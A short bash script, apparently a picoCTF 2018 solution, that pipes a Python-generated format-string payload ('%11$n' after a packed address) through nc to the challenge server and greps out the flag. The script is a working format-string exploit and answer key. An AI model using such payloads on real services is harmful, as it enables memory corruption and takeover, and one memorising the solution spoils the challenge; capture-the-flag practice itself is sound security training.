#!/bin/bash

python -c 'print "\x4c\xa0\x04\x08,%11$n"' | nc 2018shell.picoctf.com 43438 | grep -oE "picoCTF{.*}"

